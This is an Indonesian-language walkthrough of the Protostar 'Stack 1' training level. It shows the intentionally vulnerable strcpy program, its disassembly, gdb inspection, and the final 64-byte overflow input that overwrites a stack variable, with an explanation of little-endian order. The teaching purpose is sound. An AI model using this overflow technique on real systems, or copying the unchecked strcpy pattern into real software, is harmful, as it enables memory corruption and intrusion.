# Stack 1
## Tentang
Level ini memperkenalkan konsep memodifikasi variabel ke nilai tertentu dalam program, dan bagaimana variabel diletakkan dalam memori.

## Source Code
```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  if(argc == 1) {
      errx(1, "please specify an argument\n");
  }

  modified = 0;
  strcpy(buffer, argv[1]);

  if(modified == 0x61626364) {
      printf("you have correctly got the variable to the right value\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }
}
```

## Target Exploits
Pada level ini kita ditargetkan untuk mengubah variabel **modified** menjadi 0x61626364 untuk mencetak string "you have correctly got the variable to the right value". Pada program diatas, input kita disimpan pada kedalam buffer menggunakan fungsi **strcpy()**.

## Kerentanan Program
**strcpy()** bukanlah fungsi yang berbahaya seperti gets(), namun pada program diatas, ia tidak menentukan seberapa banyak buffer bisa disimpan di dalam alamat memory sehingga kita dapat menimpa alamat alamat seterusnya. Ini yang akan kita manfaatkan untuk menimpa nilai dari modified variabel.


## Lets Dive Deeper
**[!] Disclaimer** saya disini memindahkannya dari Protostar machine kedalam local maschine saya, agar lebih mudah untuk menganalisis programnya. Disini saya juga menggunakan ekstensi dari GDB yaitu gef. Jadi alamat pada machine anda mungkin berbeda.

> **gdb --args stack1 AAAA** </br>
> **disass main**
```
   0x08048464 <+0>:	push   ebp
   0x08048465 <+1>:	mov    ebp,esp
   0x08048467 <+3>:	and    esp,0xfffffff0
   0x0804846a <+6>:	sub    esp,0x60
   0x0804846d <+9>:	cmp    DWORD PTR [ebp+0x8],0x1
   0x08048471 <+13>:	jne    0x8048487 <main+35>
   0x08048473 <+15>:	mov    DWORD PTR [esp+0x4],0x80485a0
   0x0804847b <+23>:	mov    DWORD PTR [esp],0x1
   0x08048482 <+30>:	call   0x8048388 <errx@plt>
   0x08048487 <+35>:	mov    DWORD PTR [esp+0x5c],0x0
   0x0804848f <+43>:	mov    eax,DWORD PTR [ebp+0xc]
   0x08048492 <+46>:	add    eax,0x4
   0x08048495 <+49>:	mov    eax,DWORD PTR [eax]
   0x08048497 <+51>:	mov    DWORD PTR [esp+0x4],eax
   0x0804849b <+55>:	lea    eax,[esp+0x1c]
   0x0804849f <+59>:	mov    DWORD PTR [esp],eax
   0x080484a2 <+62>:	call   0x8048368 <strcpy@plt>
   0x080484a7 <+67>:	mov    eax,DWORD PTR [esp+0x5c]
   0x080484ab <+71>:	cmp    eax,0x61626364
   0x080484b0 <+76>:	jne    0x80484c0 <main+92>
   0x080484b2 <+78>:	mov    DWORD PTR [esp],0x80485bc
   0x080484b9 <+85>:	call   0x8048398 <puts@plt>
   0x080484be <+90>:	jmp    0x80484d5 <main+113>
   0x080484c0 <+92>:	mov    edx,DWORD PTR [esp+0x5c]
   0x080484c4 <+96>:	mov    eax,0x80485f3
   0x080484c9 <+101>:	mov    DWORD PTR [esp+0x4],edx
   0x080484cd <+105>:	mov    DWORD PTR [esp],eax
   0x080484d0 <+108>:	call   0x8048378 <printf@plt>
   0x080484d5 <+113>:	leave
   0x080484d6 <+114>:	ret
```

Dapat kita lihat bahwa di alamat **0x080484a2** terdapat fungsi strcpy() yang meminta argument ketika program dijalankan, disini kita memasukkan argumen AAAA kedalam programnya. Setelah strcpy() dijalankan kita dapat melihat pada alamat **0x080484ab** terdapat perintah cmp. Pada assembly cmp digunakan untuk membandingkan nilai satu sama lain, disini dapat dilihat register **eax** dan **0x61626364** yang dibandingkan. Namun apa nilai eax?. Lets find out! </br>

Kita dapat meletakkan breakpoint pada alamat **0x080484ab** untuk melihat nilainya
> b *0x080484ab </br>
> x/wx $esp+0x5c  </br>
> x/wx $eax  </br>

```
gef➤  x/wx $esp+0x5c
0xffffcdcc:	0x00000000
gef➤  x/wx $eax
0x0:	Cannot access memory at address 0x0
```

Dapat kita lihat bahwa nilai dari $esp+0x5c yang dimasukkan kedalam eax adalah 0. Jadi kita dapat menduga bahwa $esp+0x5c adalah dimana nilai modified variabel disimpan. </br>
Sekarang kita sudah mengetahui dimana modified variabel disimpan, tapi seberapa banyak karakter yang kita butuhkan untuk mengubah nilainya? </br></br>

Pertama tama kita cari tahu terlebih dahulu dimana input kita disimpan. Pada alamat **0x0804849b** kita dapat melihat perintah lea *(load effective address)*, cara bekerjanya sedikit mirip dengan *mov*. Jadi coba kita lihat berapa nilai dari **$esp+0x1c**

> x/wx $esp+0x1c </br>

```
gef➤  x/wx $esp+0x1c
0xffffcd8c:	0x41414141
```

Nah 0x41414141 adalah **AAAA** yang kita masukkan sebagai argumen pada program. Jadi dapat disimpulkan alamat input kita berada pada **0xffffcd8c** dan alamat yang ingin kita ubah adalah **0xffffcdcc**. Terlihat tidak begitu jauh bukan?. Coba kita hitung seberapa banyak yang kita butuhkan.

>p/d 0xffffcdcc - 0xffffcd8c

```
gef➤  p/d 0xffffcdcc - 0xffffcd8c
$2 = 64
```

Kita sekarang tau bahwa kita membutuhkan 64 karakter untuk sampai ke alamat tersebut. Mari kita coba!

```
./stack1 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Try again, you got 0x00000000
```

Kita masih belum mengubah variabel nya, coba kita tambahkan string **BBBB** setelahnya

```
./stack1 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
Try again, you got 0x42424242
```

Dapat dilihat bahwa **0x42424242** muncul sebagai representasi dari **BBBB**. Masih ingatkah anda dengan target utama kita?, yaitu mengubah variabel modified menjadi 0x61626364, yang artinya **BBBB** kita ganti dengan hex tersebut dalam ASCII. Coba kita lihat berapa hex tersebut dalam ASCII

> python </br>
> chr(0x61) + chr(0x62) + chr(0x63) + chr(0x64)

```
python
>>> chr(0x61) + chr(0x62) + chr(0x63) + chr(0x64)
'abcd'
```
Sudah kita ketahui sekarang apa saja yang kita butuhkan untuk mengubah variabelnya, mari kita coba kembali
```
./stack1 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAabcd 
Try again, you got 0x64636261
```

Ha? mengapa kita mendapatkan **0x64636261** bukan **0x61626364**?. Itu terjadi karena litle endian.

### Litle Endian
> Little-endian Menyimpan byte paling tidak signifikan (yang disebut “ujung paling kecil”) terlebih dahulu. Ini berarti bahwa byte pertama (pada alamat memori terendah) adalah yang terkecil, yang paling masuk akal bagi orang, yaitu membaca dari kanan ke kiri

Sekarang kita sudah mengetahui apa itu litle endian, mari kita coba sekali lagi dengan membaliknya menjadi **dcba** untuk mengalahkan level ini!
```
./stack1 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAdcba
you have correctly got the variable to the right value
```

Yeay! Kita berhasil menyelesaikannya
